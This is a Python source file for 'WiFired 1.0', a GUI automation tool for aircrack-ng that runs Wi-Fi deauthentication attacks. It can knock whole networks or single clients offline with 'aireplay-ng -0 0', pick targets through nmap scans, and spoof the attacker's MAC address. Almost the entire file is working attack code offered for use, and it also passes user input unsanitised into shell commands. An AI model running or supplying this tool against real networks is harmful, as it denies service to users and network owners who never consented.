#WIFIRED VERSION 1.0
#I poured countless hours into this program. Use it, mod it, but please, don't claim credit for it.
#An Aireplay-ng automation suite, complete with GUI. Designed for Kali Linux, but runs on any linux machine
#provided it has the correct dependancies.
#Python 2, aircrack-ng suite, easygui, subprocess, optionally macchanger, etc. You'll see.
from easygui import *
import os, sys
import time as t
from subprocess import Popen
def d(x):
	os.system("rm "+x)
if "-m" in sys.argv[1:]:
	spoof="True"
else:
	spoof="False"
try:
	print("DIAGNOSIS CONSOLE. You only need to pay attention to this if you're debugging or something")
	print("Stopping any existing monitor mode.")
	os.system("airmon-ng stop wlan0mon")
	print("Waiting for skids to leave...")
	t.sleep(5)
	if spoof=="True":
		print("Spoofing MAC address...")
		os.system("ifconfig wlan0 down")
		os.system("macchanger -r wlan0")
		os.system("ifconfig wlan0 up")
	mode=str(indexbox("Welcome to WiFired 1.0. Please select mode.","Welcome",["Mass Network Deauth (Any network)","Specific target (IP or MAC) (Known Network)","Local Network Discovery (Local Network Only)","Exit"]))
	print("MODE SELECTED. MODE: "+mode)
	if mode=="0":
		msgbox("Getting WiFi data. This may take a moment.","WiFi Retrieval","Proceed")
		print("WiFi DATA:")
		os.system("nmcli dev wifi")
		print("Ejecting simple version into a file for retrieval...")
		os.system("sudo iw dev wlan0 scan | grep SSID >wifis.lst")
		print("Retrieving data from that file and then deleting it (Because I gave up on Popen)")
		f=open("wifis.lst","r")
		wifis=str(f.read())
		f.close()
		os.system("rm wifis.lst")
		wifis=wifis.replace("\t","")
		print("Wifi list:\n"+wifis)
		wifis=wifis.split("\n")
		target=choicebox("Please select a network","Network targeting",wifis)
		msgbox("Going into monitor mode... WiFi shutting down for now.","Status","OK")
		os.system("airmon-ng start wlan0")
		os.system('gnome-terminal --geometry=120x50 -e "airodump-ng wlan0mon"')
		channel=enterbox("Airodump-ng engaged. Please find the channel (An integer listed under CH) assosiated with the target ("+target+") and enter it here.","Channel selection","Channel: (Ex:11)","Got it")
		os.system("pkill airodump-ng")
		msgbox("All data retrieved. Engaging network shutdown.")
		os.system("airmon-ng stop wlan0mon && airmon-ng start wlan0 "+str(channel))
		target=target.replace("SSID: ","")
		os.system("gnome-terminal -e 'aireplay-ng -0 0 -e "+target+" wlan0mon'")
		msgbox("Seige underway. Access point: \nOFFLINE\nTo stop the seige, press the Terminate Attack button.\n Notice: Not all cards will accept the deauth. Most will but for best results select a specific target from the main menu.","Seige underway","Terminate Attack")
		os.system("pkill aireplay-ng")
		os.system("airmon-ng stop wlan0mon")
		msgbox("Terminated attack. Monitor mode shut back down.","Thank you for flying with WiFired","Goodbye")
	elif mode=="3":
		msgbox("Goodbye.","But we hardly knew eachother... We had a chance ahead of us. :(","Exit")
	#	exit()
	elif mode=="1":
		msgbox("Getting WiFi data. This may take a moment.","WiFi Retrieval","Proceed")
		print("WiFi DATA:")
		os.system("nmcli dev wifi")
		print("Ejecting simple version into a file for retrieval...")
		os.system("sudo iw dev wlan0 scan | grep SSID >wifis.lst")
		print("Retrieving data from that file and then deleting it (Because I gave up on Popen)")
		f=open("wifis.lst","r")
		wifis=str(f.read())
		f.close()
		os.system("rm wifis.lst")
		wifis=wifis.replace("\t","")
		print("Wifi list:\n"+wifis)
		wifis=wifis.split("\n")
		target=choicebox("Please select the target's network","Network targeting",wifis)
		macorip=ynbox("Do we know the targets MAC or only the targets local IP? (MAC is better)","Mac or IP?",["MAC","IP"])
		if str(macorip)=="0":
			ip=enterbox("Please enter target IP. IPv4 ONLY.","IP prompt","Ex.: 192.168.0.2")
			msgbox("Resolving to MAC...","MAC Resolution");
			os.system("nmap -sn "+ip+" | grep MAC | cut -c 14-30 >mac.txt")
			f=open("mac.txt","r")
			mac=f.read()
			f.close()
			print("MAC: "+mac)
		else:
			mac=enterbox("Thanks for making things easy on us :)\nPlease enter target MAC address.","MAC Targeting","Ex.: 00:CC:AA:11:22:33")
			print("MAC: "+mac)
		msgbox("Going into monitor mode... WiFi shutting down for now.","Status","OK")
		os.system("airmon-ng start wlan0")
		os.system('gnome-terminal --geometry=120x50 -e "airodump-ng wlan0mon"')
		channel=enterbox("Airodump-ng engaged. Please find the channel (An integer listed under CH) assosiated with the target ("+target+") and enter it here.","Channel selection","Channel: (Ex:11)","Got it")
		os.system("pkill airodump-ng")
		msgbox("All data retrieved. Engaging client shutdown.")
		os.system("airmon-ng stop wlan0mon && airmon-ng start wlan0 "+str(channel))
		target=target.replace("SSID: ","")
		os.system("gnome-terminal -e 'aireplay-ng -0 0 -e "+target+" -d "+mac+" wlan0mon'")
		msgbox("Seige underway. Client connection: \nOFFLINE\nTo stop the seige, press the Terminate Attack button.\n","Seige underway","Terminate Attack")
		os.system("pkill aireplay-ng")
		os.system("airmon-ng stop wlan0mon")
		msgbox("Terminated attack. Monitor mode shut back down.","Thank you for flying with WiFired","Goodbye")
	elif mode=="2":
		os.system("ifconfig | grep inet | grep broadcast | cut -c 14-24 >again.txt")
		f=open("again.txt","r")
		you=f.read()
		f.close()
		d("again.txt")
		range=enterbox("Enter network range (The first 3 sections of your IP ("+you+"), followed by 1/24 instead of the fourth. (Ex. 10.0.0.1/24)","Range","192.168.0.1/24","Done")
                msgbox("Getting user data. This may take a moment.","MAC Retrieval","Proceed")
                print("Ejecting simple version into a file for retrieval...")
                os.system("nmap -sn "+range+" | grep MAC | cut -c 14- >macs.lst")
                print("Retrieving data from that file and then deleting it (Because I gave up on Popen)")
                f=open("macs.lst","r")
                macs=str(f.read())
                f.close()
                os.system("rm macs.lst")
                macs=macs.replace("\t","")
                print("MAC list:\n"+macs)
                macs=macs.split("\n")
		wifi=enterbox("Please enter your SSID (Network name)","WiFi Name","Ex.: xfinitywifi")
                target=choicebox("Please select a target","MAC targeting",macs)
		target=target.replace("(","")
		target=target.replace(")","")
		os.system("echo "+str(target)+" | cut -c -17 > out.txt")
		f = open("out.txt","r")
		target=f.read()
		f.close()
		d("out.txt")
                msgbox("Going into monitor mode... WiFi shutting down for now.","Status","OK")
                os.system("airmon-ng start wlan0")
                os.system('gnome-terminal --geometry=120x50 -e "airodump-ng wlan0mon"')
                channel=enterbox("Airodump-ng engaged. Please find the channel (An integer listed under 'CH')","Channel Detection","Channel (Ex.: 11)")
                os.system("pkill airodump-ng")
                msgbox("All data retrieved. Engaging network shutdown.")
                os.system("airmon-ng stop wlan0mon && airmon-ng start wlan0 "+str(channel))
                os.system("gnome-terminal -e 'aireplay-ng -0 0 -e "+wifi+" -d "+target+" wlan0mon'")
                msgbox("Seige underway. Client connection: \nOFFLINE\nTo stop the seige, press the Terminate Attack button.","Owned","Terminate Attack")
                os.system("pkill aireplay-ng")
                os.system("airmon-ng stop wlan0mon")
                msgbox("Terminated attack. Monitor mode shut back down.","Thank you for flying with WiFired.","Goodbye")
       	else:
		msgbox("ERROR: Choice not implemented","WARNING","Exit")
		exit()
except KeyboardInterrupt:
	msgbox("User requested a system halt. Shutting down monitor mode.","Goodbye","Close program")
	os.system("airmon-ng stop wlan0mon")
	exit()
except:
	exceptionbox()
